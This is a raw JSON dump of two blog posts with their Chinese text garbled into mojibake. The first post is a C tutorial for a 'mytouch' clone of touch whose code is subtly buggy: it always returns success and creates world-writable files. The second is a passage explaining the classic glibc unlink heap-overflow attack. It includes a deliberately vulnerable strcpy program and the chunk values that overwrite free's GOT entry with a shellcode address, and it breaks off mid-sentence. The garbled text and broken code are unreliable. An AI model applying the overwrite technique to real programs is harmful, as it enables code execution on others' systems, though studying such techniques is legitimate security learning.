æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åˆ†æ­¥éª¤ä»å®Œæˆæ•´ä¸ªç¨‹åºçš„è¿è¡Œã€‚ èƒŒæ™¯çŸ¥è¯†çŸ¥è¯†ç‚¹1ï¼šgetoptå‡½æ•°å‡½æ•° getopt æ˜¯ä¸“é—¨è§£å†³å‚æ•°å¤„ç†çš„å‡½æ•°ã€‚åŒ…å«åœ¨å¤´æ–‡ä»¶ #include &lt;unistd.h&gt;ã€‚ä¸€èˆ¬å½¢å¼å¦‚ä¸‹ï¼š 1int getopt(int argc,char * const argv[ ],const char * optstring); ä½œç”¨ï¼š åˆ†æå‘½ä»¤è¡Œå‚æ•°ã€‚ è¿”å›å€¼ï¼šå‚æ•°å­—ç¬¦ã€‚ çŸ¥è¯†ç‚¹2ï¼šopenå‡½æ•°å‡½æ•° open æ˜¯ UNIX ç³»ç»Ÿçš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼ŒåŒºåˆ«äº C è¯­è¨€åº“å‡½æ•° fopenã€‚åŒ…å«åœ¨å¤´æ–‡ä»¶ #include &lt;fcntl.h&gt;ï¼Œä¸€èˆ¬å½¢å¼å¦‚ä¸‹ï¼š 12int open(constchar*pathname, int flags); int open(constchar*pathname, int flags, mode_t mode); ä½œç”¨ï¼šæ‰“å¼€å’Œåˆ›å»ºæ–‡ä»¶ã€‚è¿”å›å€¼ï¼šæˆåŠŸåˆ™è¿”å›æ–‡ä»¶æè¿°ç¬¦ï¼Œå¦åˆ™è¿”å› -1ã€‚ å‚æ•°è¯´æ˜ï¼š å¯¹äº open å‡½æ•°æ¥è¯´ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä»…å½“åˆ›å»ºæ–°æ–‡ä»¶æ—¶ï¼ˆå³ä½¿ç”¨äº† O_CREAT æ—¶ï¼‰æ‰ä½¿ç”¨ï¼Œç”¨äºæŒ‡å®šæ–‡ä»¶çš„è®¿é—®æƒé™ä½ï¼ˆaccess permission bitsï¼‰ã€‚pathname æ˜¯å¾…æ‰“å¼€/åˆ›å»ºæ–‡ä»¶çš„ POSIX è·¯å¾„ï¼ˆå¦‚/home/user/a.cppï¼‰ï¼›flags ç”¨äºæŒ‡å®šæ–‡ä»¶çš„æ‰“å¼€/åˆ›å»ºæ¨¡å¼ï¼Œè¿™ä¸ªå‚æ•°å¯ç”±ä»¥ä¸‹å¸¸é‡ï¼ˆå®šä¹‰äºfcntl.hï¼‰é€šè¿‡é€»è¾‘ä½æˆ–é€»è¾‘æ„æˆã€‚ 123O_RDONLY åªè¯»æ¨¡å¼O_WRONLY åªå†™æ¨¡å¼O_RDWR è¯»å†™æ¨¡å¼ å‚æ•° mode åˆ™æœ‰ä¸‹åˆ—æ•°ç§ç»„åˆ, åªæœ‰åœ¨å»ºç«‹æ–°æ–‡ä»¶æ—¶æ‰ä¼šç”Ÿæ•ˆ, æ­¤å¤–çœŸæ­£å»ºæ–‡ä»¶æ—¶çš„æƒé™ä¼šå—åˆ° umask å€¼æ‰€å½±å“, å› æ­¤è¯¥æ–‡ä»¶æƒé™åº”è¯¥ä¸º (mode-umaks). S_IRWXU 00700 æƒé™, ä»£è¡¨è¯¥æ–‡ä»¶æ‰€æœ‰è€…å…·æœ‰å¯è¯»ã€å¯å†™åŠå¯æ‰§è¡Œçš„æƒé™.S_IRUSR æˆ–S_IREAD, 00400 æƒé™, ä»£è¡¨è¯¥æ–‡ä»¶æ‰€æœ‰è€…å…·æœ‰å¯è¯»å–çš„æƒé™.S_IWUSR æˆ–S_IWRITE, 00200 æƒé™, ä»£è¡¨è¯¥æ–‡ä»¶æ‰€æœ‰è€…å…·æœ‰å¯å†™å…¥çš„æƒé™.S_IXUSR æˆ–S_IEXEC, 00100 æƒé™, ä»£è¡¨è¯¥æ–‡ä»¶æ‰€æœ‰è€…å…·æœ‰å¯æ‰§è¡Œçš„æƒé™.S_IRWXG 00070 æƒé™, ä»£è¡¨è¯¥æ–‡ä»¶ç”¨æˆ·ç»„å…·æœ‰å¯è¯»ã€å¯å†™åŠå¯æ‰§è¡Œçš„æƒé™.S_IRGRP 00040 æƒé™, ä»£è¡¨è¯¥æ–‡ä»¶ç”¨æˆ·ç»„å…·æœ‰å¯è¯»çš„æƒé™.S_IWGRP 00020 æƒé™, ä»£è¡¨è¯¥æ–‡ä»¶ç”¨æˆ·ç»„å…·æœ‰å¯å†™å…¥çš„æƒé™.S_IXGRP 00010 æƒé™, ä»£è¡¨è¯¥æ–‡ä»¶ç”¨æˆ·ç»„å…·æœ‰å¯æ‰§è¡Œçš„æƒé™.S_IRWXO 00007 æƒé™, ä»£è¡¨å…¶ä»–ç”¨æˆ·å…·æœ‰å¯è¯»ã€å¯å†™åŠå¯æ‰§è¡Œçš„æƒé™.S_IROTH 00004 æƒé™, ä»£è¡¨å…¶ä»–ç”¨æˆ·å…·æœ‰å¯è¯»çš„æƒé™S_IWOTH 00002 æƒé™, ä»£è¡¨å…¶ä»–ç”¨æˆ·å…·æœ‰å¯å†™å…¥çš„æƒé™.S_IXOTH 00001 æƒé™, ä»£è¡¨å…¶ä»–ç”¨æˆ·å…·æœ‰å¯æ‰§è¡Œçš„æƒé™. çŸ¥è¯†ç‚¹3ï¼šutimensatå‡½æ•° å‡½æ•° utimensat ä»¥çº³ç§’çº§çš„ç²¾åº¦æ”¹å˜æ–‡ä»¶çš„æ—¶é—´æˆ³ã€‚åŒ…å«åœ¨ #include &lt;sys/stat.h&gt;ï¼Œä¸€èˆ¬å½¢å¼å¦‚ä¸‹ï¼š 1int utimensat(int dirfd, const char *pathname,const struct timespec times[2], intflags); ä½œç”¨ï¼šutimensat æ˜¯ä»¥çº³ç§’çº§çš„ç²¾åº¦æ”¹å˜æ–‡ä»¶çš„æ—¶é—´æˆ³ã€‚utimensat() é€šè¿‡æ–‡ä»¶çš„è·¯å¾„ï¼ˆpathnameï¼‰è·å¾—æ–‡ä»¶ã€‚ è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å‡½æ•°éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªæ—¶é—´æ•°ç»„ times æ¥æ”¹å˜æ—¶é—´æˆ³çš„ï¼Œtimes[0] ä¿®æ”¹æœ€åä¸€æ¬¡è®¿é—®çš„æ—¶é—´(access time)ï¼Œtimes[1] ä¿®æ”¹æœ€åä¿®æ”¹çš„æ—¶é—´ (modify time)ã€‚è¯¥æ—¶é—´æ•°ç»„æ˜¯ç”±ç§’å’Œçº³ç§’ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆï¼Œæ•°æ®ç»“æ„å¦‚ä¸‹ï¼š 1234struct timespec &#123;time_t tv_sec; /* ç§’ */ long tv_nsec; /* çº³ç§’ */&#125;; ç‰¹åˆ«æ³¨æ„ï¼š å½“ times[x].tv_sec = UTIME_OMIT; ç›¸åº”çš„æ—¶é—´æˆ³ä¸å˜ï¼Œtimes[x].tv_sec = UTIME_NOW; ç›¸åº”çš„æ—¶é—´æˆ³ç¼–ç¨‹å½“å‰æ—¶é—´ æ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹ç¼–å†™ mytouch.c æºç¨‹åºï¼Œå°†åˆ†ä¸ºä¸¤æ­¥å®Œæˆã€‚ç¬¬ä¸€æ­¥æ˜¯ main å‡½æ•°ï¼Œç¬¬äºŒæ­¥æ˜¯ mytouch å­å‡½æ•°ã€‚æ³¨æ„è¿™æ˜¯ä¸€ä¸ªç¨‹åºï¼Œåªæœ‰ä¸€ä¸ª .c æ–‡ä»¶ã€‚ è®¾è®¡mainå‡½æ•°main å®Œæˆçš„å·¥ä½œæ˜¯ä»å‘½ä»¤è¡Œæ¥æ”¶å‚æ•°ï¼Œå¹¶è§£æé€‰é¡¹ï¼Œè®¾ç½®ç›¸åº”çš„æ ‡å¿—å˜é‡ï¼Œç„¶åè°ƒç”¨ mytouch å‡½æ•°ã€‚main å‡½æ•°ä¸­ä¸¤ä¸ªå‚æ•°æ˜¯ç”¨æ¥æ¥æ”¶å‘½ä»¤è¡Œä¼ è¿›æ¥çš„å‚æ•° int argc, char **argvã€‚ ä»å‘½ä»¤è¡Œä¸­å¾—åˆ°å‘½ä»¤çš„é€‰é¡¹ï¼Œå³ä»¥â€™-â€˜å¼€å¤´çš„å‚æ•°ã€‚ç›®å‰åªæ”¯æŒä¸‰ç§é€‰å‹ -a, -c, -mï¼Œåˆ™éœ€ç»™ getopt ä¼ å‚â€acmâ€å³å¯ã€‚ä»£ç å¦‚ä¸‹ï¼š 1while ((c = getopt(argc, argv, &quot;acm&quot;)) != -1) ç¼–å†™æºç¨‹åº mytouch.cï¼š é¢„å¤„ç†åŠŸèƒ½åŠ main å‡½æ•°ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdio.h&gt;#include &lt;getopt.h&gt;#include &lt;sys/types.h&gt;#include &lt;time.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;#include &lt;sys/time.h&gt;#include &lt;sys/stat.h&gt;#define CH_ATIME 1#define CH_MTIME 2//å®šä¹‰åˆ›å»ºæ–‡ä»¶æ—¶çš„æ¨¡å¼ï¼Œæ­¤å¤„å¯¹ç”¨æˆ·ï¼Œç»„ï¼Œå…¶ä»–è®¾ç½®çš„æƒé™éƒ½æ˜¯å¯è¯»å¯å†™ã€‚#define MODE_RW_UGO (S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH)//æ ‡å¿—æ–‡ä»¶access time å’Œ modify timeçš„æ”¹å˜æƒ…å†µstatic int change_times;// å¦‚æœæœ‰(-c)é€‰é¡¹ï¼Œå¹¶ä¸”ä¸å­˜åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥çš„æ–‡ä»¶åï¼Œåˆ™ä¸åˆ›å»º static bool no_create;//å½“è®¾ç½®æ–°çš„access time å’Œ modify timeçš„æ—¶å€™ä½¿ç”¨static struct timespec newtime[2];//mytouchå‘½ä»¤æ ¸å¿ƒçš„æ ¸å¿ƒæ¨¡å—ï¼Œç”¨äºåˆ›å»ºæˆ–è€…æ›´æ–°æ–‡ä»¶çš„æ—¶é—´æˆ³ã€‚int main(int argc, char **argv)&#123; int c; bool ok = true; //åˆå§‹åŒ– okã€change_timesã€no_createï¼š change_times = 0; no_create = false; //ä»å‘½ä»¤è¡Œä¸­å¾—åˆ°å‘½ä»¤çš„é€‰é¡¹ï¼Œå³ä»¥&#x27;-&#x27;å¼€å¤´çš„å‚æ•°ã€‚ç›®å‰åªæ”¯æŒä¸‰ç§é€‰å‹-a, -c, -mã€‚ while ((c = getopt(argc, argv, &quot;acm&quot;)) != -1) &#123; switch (c) &#123; case &#x27;a&#x27;: change_times |= CH_ATIME; break; case &#x27;c&#x27;: no_create = true; break; case &#x27;m&#x27;: change_times |= CH_MTIME; break; default: printf(&quot;fault option!&quot;); &#125; &#125; if (change_times == 0) change_times = CH_ATIME | CH_MTIME; //å½“newtime[0]. newtime[0].tv_nsec = UTIME_NOW; newtime[1].tv_nsec = UTIME_NOW; //å¦‚æœoptind == argcï¼Œä»£è¡¨å°‘è¾“å…¥æ–‡ä»¶åå­—ã€‚ if (optind == argc) &#123; printf(&quot;missing file operand\\n&quot;); &#125; //é’ˆå¯¹å¤šä¸ªæ–‡ä»¶åå­—è°ƒç”¨mytouchå‡½æ•° for (; optind &lt; argc; ++optind) ok &amp;= mytouch(argv[optind]); exit(ok ? EXIT_SUCCESS : EXIT_FAILURE);&#125; è®¾è®¡mytouchå‡½æ•°mytouch ä¸»è¦å®ç°åˆ›å»ºæ–‡ä»¶å’Œæ›´æ”¹æ–‡ä»¶çš„ä¸¤ç§ä¹‹é—´çš„åŠŸèƒ½ã€‚åˆ›å»ºæ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼š å¯¹äº open å‡½æ•°æ¥è¯´ï¼Œfile æ˜¯ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶åå­—ã€‚O_CREAT | O_WRONLY ä»£è¡¨è¯¥å‡½æ•°çš„é€‰é¡¹æ˜¯æ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºå’Œåªå†™æ‰“å¼€ã€‚æœ€åä¸€ä¸ªå‚æ•°æŒ‡å®šåˆ›å»ºçš„æ–‡ä»¶æ˜¯æƒé™æ˜¯æ‰€æœ‰ç”¨æˆ·å¯è¯»å¯å†™ã€‚ 1fd = open(file, O_CREAT | O_WRONLY, MODE_RW_UGO); ä¿®æ”¹æ–‡ä»¶çš„æ—¶é—´æˆ³ä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š å¯¹äº utimensat å‡½æ•°æ¥è¯´ï¼Œç¬¬ä¸€ä¸ªå‚æ•° AT_FDCWD æŒ‡å®šåˆ›å»ºæ–‡ä»¶çš„è·¯å¾„æ˜¯å½“å‰å·¥ä½œç›®å½•ã€‚ç¬¬äºŒä¸ªå‚æ•° file æŒ‡å®šè¦ä¿®æ”¹çš„æ—¶é—´æˆ³æ–‡ä»¶åã€‚ç¬¬ä¸‰ä¸ªå‚æ•° newtime æŒ‡å®šä¿®æ”¹çš„å…·ä½“æ—¶é—´å€¼ã€‚æœ€åä¸€ä¸ªå‚æ•°é»˜è®¤ä¸º 0ã€‚ 1utimensat(AT_FDCWD, file, newtime, 0) mytouch å‡½æ•°å…·ä½“çš„å‡½æ•°é€»è¾‘å¦‚ä¸‹ï¼š è¯¥å‡½æ•°é¦–å…ˆåˆ¤æ–­ no_create æ˜¯å¦ä¸ºå‡ï¼Œè‹¥ä¸ºå‡ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ã€‚ç„¶åæ£€æµ‹ change_times çš„å€¼ï¼Œå¹¶æ ¹æ®å…¶å€¼åšç›¸å…³çš„å¤„ç†ã€‚ mytouch å­å‡½æ•°ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627static boolmytouch(const char *file)&#123; bool ok; int fd = -1; if (!no_create) &#123; fd = open(file, O_CREAT | O_WRONLY, MODE_RW_UGO); &#125; //åœ¨ä¸»å‡½æ•°ä¸­ï¼Œå¦‚æœæ²¡æœ‰æ£€æµ‹åˆ°ï¼ˆ-aï¼‰ï¼ˆ-mï¼‰ï¼Œåˆ™change_times == (CH_ATIME | CH_MTIME)ï¼Œ\\ å¦åˆ™æŒ‰ç…§é€‰é¡¹åªç”¨æ”¹å˜å…¶ä¸­ä¸€ä¸ªæ—¶é—´æˆ³ã€‚ if (change_times != (CH_ATIME | CH_MTIME)) &#123; //åªè®¾å®šå…¶ä¸­ä¸€ä¸ªæ—¶é—´å€¼ã€‚ if (change_times == CH_MTIME) //å¦‚æœchange_times == CH_MTIMEï¼Œå³ï¼ˆ-mï¼‰,å°†å¯¹åº”çš„ä¿®æ”¹access time\\ çš„timespecç»“æ„çš„tv_nsecè®¾ç½®ä¸ºUTIME_OMIT;å‚è€ƒutimensatå‡½æ•°çš„ç”¨æ³• newtime[0].tv_nsec = UTIME_OMIT; else //å¦‚æœchange_times == CH_MTIMEï¼Œå³ï¼ˆ-aï¼‰,å°†å¯¹åº”çš„ä¿®æ”¹modify time\\ çš„timespecç»“æ„çš„tv_nsecè®¾ç½®ä¸ºUTIME_OMIT;å‚è€ƒutimensatå‡½æ•°çš„ç”¨æ³• newtime[1].tv_nsec = UTIME_OMIT; &#125; //AT_FDCWDè¡¨ç¤ºå½“å‰å·¥ä½œç›®å½•ã€‚ ok = (utimensat(AT_FDCWD, file, newtime, 0) == 0); return true;&#125; æµ‹è¯•å‡½æ•°åŠŸèƒ½è¾“å…¥ä»¥ä¸‹å‘½ä»¤ç¼–è¯‘å¹¶å¼€å§‹æµ‹è¯•å‡½æ•°åŠŸèƒ½ï¼š 1gcc -o mytouch mytouch.c æµ‹è¯•ä¸å¸¦é€‰é¡¹çš„ mytouch åŠŸèƒ½åˆ›å»ºåå­—ä¸º shiyanlou çš„æ–‡ä»¶ã€‚å¹¶ä¸”æŸ¥çœ‹è¯¥æ–‡ä»¶çš„çŠ¶æ€ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š 12./mytouch shiyanloustat shiyanlou æ³¨æ„åˆ°æœ€è¿‘è®¿é—®ã€æœ€è¿‘æ›´æ”¹å’Œæœ€è¿‘æ”¹åŠ¨çš„æ—¶é—´å‡æ˜¯æ‰§è¡Œ ./mytouch shiyanlou çš„æ—¶é—´ã€‚ æµ‹è¯• -a é€‰é¡¹ æ³¨æ„åˆ°æœ€è¿‘è®¿é—®ã€æœ€è¿‘æ”¹åŠ¨çš„æ—¶é—´å‡æ˜¯æ‰§è¡Œ ./mytouch -a shiyanlou çš„æ—¶é—´ã€‚ æµ‹è¯• -m é€‰é¡¹ æ³¨æ„åˆ°æœ€è¿‘æ›´æ”¹ã€æœ€è¿‘æ”¹åŠ¨çš„æ—¶é—´å‡æ˜¯æ‰§è¡Œ ./mytouch -m shiyanlou çš„æ—¶é—´ã€‚ æµ‹è¯• -c é€‰é¡¹","categories":[{"name":"C","slug":"C","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/"},{"name":"Linux","slug":"C/Linux","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/Linux/"},{"name":"touch","slug":"C/Linux/touch","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/Linux/touch/"}],"tags":[{"name":"C","slug":"C","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/C/"},{"name":"Linux","slug":"Linux","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Linux/"}]},{"title":"unlinkæ¼æ´æ”»å‡»","slug":"Heap/unlinkæ¼æ´æ”»å‡»","date":"2020-10-24T11:01:21.000Z","updated":"2020-10-24T11:35:20.000Z","comments":true,"path":"2020/10/24/Heap/unlinkæ¼æ´æ”»å‡»/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/","excerpt":"","text":"ä»ä¸€æ®µä»£ç å¼€å§‹123456789101112#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123; char *first, *second; first = malloc(666); second = malloc(12); if (argc != 1) strcpy(first, argv[1]); free(first); free(second); return 0;&#125; ä¸Šè¿°ç¨‹åºåœ¨åˆ†é…å®Œå †åï¼Œå †å†…å­˜åˆ†å¸ƒå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç¨‹åºä¸­ strcpy å‡½æ•°ä¼šå¯¼è‡´å †æº¢å‡ºï¼Œargv[1] å¤§äº 666 å­—èŠ‚æ—¶ï¼Œå¯è¦†ç›–ç¬¬äºŒä¸ª chunk çš„å„ä¸ªå­—æ®µä¸ºæŒ‡å®šçš„å€¼ï¼Œä»è€Œä½¿å †ç®¡ç†å™¨å°†ç¬¬äºŒä¸ª chunk åˆ¤æ–­ä¸ºç©ºé—²çŠ¶æ€ã€‚æ ¹æ® malloc çš„å†…å­˜å›æ”¶æœºåˆ¶ï¼Œåœ¨ free(first) æ—¶ä¼šå°†ä¸Šå›¾ä¸­çš„ second chunk ä» bin ä¸­ unlinkï¼Œå¹¶ä¸ç¬¬ä¸€ä¸ª chunk åˆå¹¶ã€‚é€šè¿‡ä¿®æ”¹ second chunk çš„ fdã€bk å­—æ®µï¼Œunlink æ—¶å¯æŠŠ free å‡½æ•°çš„ GOT è¡¨é¡¹å†™ä¸º shellcode åœ°å€ã€‚å½“ç¨‹åºå†æ¬¡è°ƒç”¨ free å‡½æ•°æ—¶ä¼šæ‰§è¡Œ shellcodeã€‚ ä»€ä¹ˆæ˜¯unlinkunlinkæ”»å‡»æŠ€æœ¯å°±æ˜¯åˆ©ç”¨â€glibc mallocâ€çš„å†…å­˜å›æ”¶æœºåˆ¶ï¼Œå½“å †å—freeæ—¶ï¼Œä¼šæ£€æŸ¥ç›¸é‚»çš„åé¢çš„å †å—ï¼ˆåœ°å€æ›´å°çš„ï¼‰æˆ–è€…å‰é¢çš„å †å—ï¼ˆåœ°å€æ›´å¤§çš„ï¼‰æ˜¯å¦ç©ºé—²ï¼Œå¦‚æœç©ºé—²ï¼Œé‚£ä¹ˆéœ€è¦è¿›è¡Œå †å—åˆå¹¶æ“ä½œã€‚ ç©ºé—²çš„å †å—ä¸€èˆ¬ä»¥åŒå‘é“¾è¡¨çš„å½¢å¼ç»„ç»‡ï¼ˆfast binæ˜¯å•å‘é“¾è¡¨ï¼Œæ­¤æ”»å‡»ä¸é€‚ç”¨ï¼‰ï¼Œå¦‚æœåˆšåˆšé‡Šæ”¾çš„å †å—è¦ä¸å‰é¢æˆ–è€…åé¢ç©ºé—²çš„å †å—è¿›è¡Œåˆå¹¶æ“ä½œï¼Œé‚£ä¹ˆéœ€è¦å°†å‰æˆ–åçš„å †å—ä»åŒå‘é“¾è¡¨ä¸­æ‘˜ä¸‹æ¥ï¼Œåˆå¹¶æˆæ›´å¤§çš„å †å—æ’å…¥åˆ°unsort biné“¾è¡¨ä¸­ã€‚ç©ºé—²å †å—ä»ï¼ˆsmall bin)åŒå‘é“¾è¡¨ä¸­æ‘˜ä¸‹æ¥çš„æ“ä½œå°±æ˜¯unlinkã€‚ å‘ååˆå¹¶é¦–å…ˆåˆ¤æ–­å‰ä¸€ä¸ª chunk æ˜¯å¦ç©ºé—²ï¼Œå³æ£€æŸ¥å½“å‰ chunk çš„ PREV_INUSEï¼ˆPï¼‰ä½æ˜¯å¦ä¸º 0ã€‚è‹¥ä¸ºç©ºé—²ï¼Œåˆ™å°†å…¶åˆå¹¶ã€‚åˆå¹¶æ—¶ï¼Œæ”¹å˜å½“å‰ chunk æŒ‡é’ˆæŒ‡å‘å‰ä¸€ä¸ª chunkï¼Œä½¿ç”¨ unlink å®å°†å‰ä¸€ä¸ªç©ºé—² chunk ä» bin ä¸­ç§»é™¤ï¼Œæœ€åæ›´æ–°åˆå¹¶å chunk çš„å¤§å°ã€‚ malloc.c ä¸­å‘ååˆå¹¶çš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213INTERNAL_SIZE_T hd = p-&gt;size; /* its head field */INTERNAL_SIZE_T sz; /* its size */INTERNAL_SIZE_T prevsz; /* size of previous contiguous chunk */sz = hd &amp; ~PREV_INUSE;/* consolidate backward */if (!(hd &amp; PREV_INUSE))&#123; prevsz = p-&gt;prev_size; p = chunk_at_offset(p, -(long)prevsz); sz += prevsz; unlink(p, bck, fwd);&#125;set_head(p, sz | PREV_INUSE); æœ¬ä¾‹ä¸­ï¼Œé‡Šæ”¾ 1st chunk æ—¶ï¼Œå½“å‰ chunk(1st chunk) çš„å‰ä¸€ä¸ª chunk æ˜¯ allocatedï¼Œæ‰€ä»¥ä¸èƒ½å‘ååˆå¹¶ï¼Œunlink å®ä¸ä¼šè¢«è°ƒç”¨ã€‚ å‘å‰åˆå¹¶é¦–å…ˆåˆ¤æ–­ä¸‹ä¸ª chunk æ˜¯å¦ç©ºé—²ï¼Œå³æ£€æŸ¥ä¸‹ä¸‹ä¸ª chunkï¼ˆç›¸å¯¹å½“å‰ chunkï¼‰çš„ PREV_INUSEï¼ˆPï¼‰ä½æ˜¯å¦ä¸º 0ï¼Œè‹¥ä¸º 0 è¡¨æ˜ä¸‹ä¸ª chunk æ˜¯ç©ºé—²çš„ï¼Œåˆ™è¿›è¡Œåˆå¹¶ã€‚åˆå¹¶æ—¶ä½¿ç”¨ unlink å®å°†ä¸‹ä¸ª chunk ä»å®ƒçš„ bin ä¸­ç§»é™¤ï¼Œå¹¶æ›´æ–°åˆå¹¶åçš„ chunk å¤§å°ã€‚ malloc.c ä¸­å‘å‰åˆå¹¶çš„ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718/* check/set/clear inuse bits in known places */#define inuse_bit_at_offset(p, s)\\ (((mchunkptr)(((char*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)INTERNAL_SIZE_T hd = p-&gt;size; /* its head field */INTERNAL_SIZE_T sz; /* its size */sz = hd &amp; ~PREV_INUSE;next = chunk_at_offset(p, sz);nextsz = chunksize(next);/* consolidate forward */if (!(inuse_bit_at_offset(next, nextsz))) &#123; sz += nextsz; ... unlink(next, bck, fwd); next = chunk_at_offset(p, sz);&#125;set_head(p, sz | PREV_INUSE);next-&gt;prev_size = sz; æœ¬ä¾‹ä¸­ï¼Œé‡Šæ”¾1st chunk æ—¶ï¼Œå½“å‰ chunk çš„ä¸‹ä¸€ä¸ª chunkï¼ˆ2nd chunkï¼‰æ˜¯ allocatedï¼Œæ‰€ä»¥ä¸èƒ½å‘å‰åˆå¹¶ï¼Œunlink å®ä¸ä¼šè¢«è°ƒç”¨ã€‚ unlinkå½“å‰é‡Šæ”¾çš„å †ä¸å‰ä¸€ä¸ªæˆ–åä¸€ä¸ªç©ºé—² chunk è¿›è¡Œåˆå¹¶æ—¶ï¼Œä¼šæŠŠç©ºé—² chunk ä» bin ä¸­ç§»é™¤ï¼Œç§»é™¤è¿‡ç¨‹ä½¿ç”¨ unlink å®æ¥å®ç°ã€‚unlink å®çš„å®šä¹‰å¦‚ä¸‹ï¼š 1234567/* Take a chunk off a bin list */#define unlink(P, BK, FD) &#123; \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\&#125; unlink å³ä¸ºå°† P ä»é“¾è¡¨ä¸­åˆ é™¤çš„è¿‡ç¨‹ã€‚ unlinkæ”»å‡»åœ¨ dlmalloc ä¸­ï¼Œunlink çš„å®šä¹‰å¦‚ä¸Šä¸€èŠ‚æ‰€ç¤ºï¼Œåªæœ‰ä¸æŒ‡é’ˆæ“ä½œç›¸å…³çš„ 4 æ¡è¯­å¥ã€‚ä½†åœ¨è¾ƒæ–°ç‰ˆæœ¬çš„ glibc ä¸­ï¼Œä¸ºäº†ç¼“è§£æ”»å‡»è€…è¿›è¡Œ unlink æ”»å‡»ï¼Œåœ¨å®å®šä¹‰ä¸­åŠ å…¥äº†å®‰å…¨æ ¡éªŒï¼Œä½¿å¾—åˆ©ç”¨éš¾åº¦åŠ å¤§ï¼Œåªèƒ½åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ä½¿ç”¨ä¸€äº›æŠ€å·§ç»•è¿‡æ ¡éªŒã€‚ åŸå§‹çš„ unlink æ”»å‡»è¿°ä¾‹å­ä¸­ï¼Œä¼ å…¥çš„å­—ç¬¦ä¸²å‚æ•°é•¿åº¦å¤§äº 666 å­—èŠ‚æ—¶ strcpy ä¼šä½¿ first chunk æº¢å‡ºï¼Œå¯è¦†ç›– second chunk çš„å¤´éƒ¨å­—æ®µä¸ºå¦‚ä¸‹å€¼ï¼š 1234prev_size = å¶æ•°size = -4fd = free@got - 12bk = shellcode address åœ¨æ‰§è¡Œ free(first) æ—¶ï¼Œå½“å‰é‡Šæ”¾çš„ frist chunk çš„ä¸‹ä¸‹ä¸ª chunk ä¸æ˜¯ top chunkã€‚å› ä¸º second chunk çš„å¤§å°è¦†ç›–ä¸º -4ï¼Œæ‰€ä»¥ä¸‹ä¸‹ä¸ª chunk åœ¨ second chunk åç§»ä¸º -4 çš„ä½ç½®ï¼Œå› æ­¤ malloc æŠŠ second chunk çš„ prev_size å½“åšä¸‹ä¸‹ä¸ª chunk çš„ sizeã€‚è€Œ prev_size å·²è¢«è¦†ç›–ä¸ºå¶æ•°ï¼ˆPREV_INUSEä½ä¸º0ï¼‰ï¼Œmalloc ä¼šå°† second chunk å½“ä½œç©ºé—² chunkã€‚ é‡Šæ”¾ first chunk æ—¶ä¼šå°† second chunk ä» bin ä¸­ unlinkï¼Œå¹¶å°†å…¶åˆå¹¶åˆ° first chunkã€‚è¿™ä¸ªè¿‡ç¨‹ä¼šè§¦å‘ unlinkï¼ˆsecondï¼‰ï¼Œæ­¤æ—¶ P = second chunk ptrï¼Œunlink è¿‡ç¨‹å¦‚ä¸‹ï¼š 12341ï¼‰FD = second chunk ptr-&gt;fd = free@got â€“ 122ï¼‰BK = second chunk ptr-&gt;bk = shellcode address3ï¼‰FD-&gt;bk = BKï¼Œå³ *((free@gotâ€“12)-&gt;bk) = shellcode address4ï¼‰BK-&gt;fd = FDï¼Œå³ *(shellcode address-&gt;fd) = free@got â€“ 12 unlink æ­¥éª¤ 1ï¼‰å’Œ 2ï¼‰å°† second chunk çš„ fd å’Œ bk å¤åˆ¶åˆ° FD å’Œ BKã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¤åˆ¶å FD = free@got-12ï¼ŒBK = shellcode addressï¼Œå³ second chunk çš„ fdã€bk æŒ‡é’ˆåˆ†åˆ«æŒ‡å‘ free@got-12 å’Œ shellcode addressã€‚ æ­¥éª¤ 3ï¼‰ä¸­ FD æ˜¯ malloc_chunk ç»“æ„ä½“æŒ‡é’ˆï¼ŒFD-&gt;bk ç›¸å½“äº FD+12 = free@got-12+12 = free@gotï¼Œå³ FD-&gt;bk æŒ‡å‘ free çš„ GOT è¡¨é¡¹ï¼ŒFD-&gt;bk = BK ç›¸å½“äº free@got = shellcode addressï¼Œå³ free çš„ GOT è¡¨é¡¹è¢«ä¿®æ”¹ä¸ºäº† shellcode åœ°å€ã€‚å› æ­¤ï¼Œç¨‹åºåœ¨æ‰§è¡Œç¬¬äºŒä¸ª free æ—¶å°±ä¼šæ‰§è¡Œ shellcodeã€‚ åŒç†ï¼Œæ­¥éª¤4ï¼‰ä¸­å°† shellcode addr + 8 å¤„ 4 ä¸ªå­—èŠ‚è¦†ç›–ä¸º free@got - 12ï¼Œæ‰€ä»¥åœ¨ç¼–å†™ shellcode 